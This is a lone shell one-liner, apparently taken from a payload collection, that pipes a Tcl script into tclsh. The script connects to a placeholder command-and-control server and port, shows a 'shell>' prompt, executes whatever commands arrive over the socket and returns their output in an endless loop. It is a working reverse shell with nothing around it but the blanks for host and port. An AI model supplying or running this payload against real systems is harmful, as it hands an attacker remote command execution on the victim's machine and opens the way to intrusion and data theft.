echo 'set s [socket XX_CC_SERVER_IP XX_PORT];while 42 { puts -nonewline $s \"shell>\";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh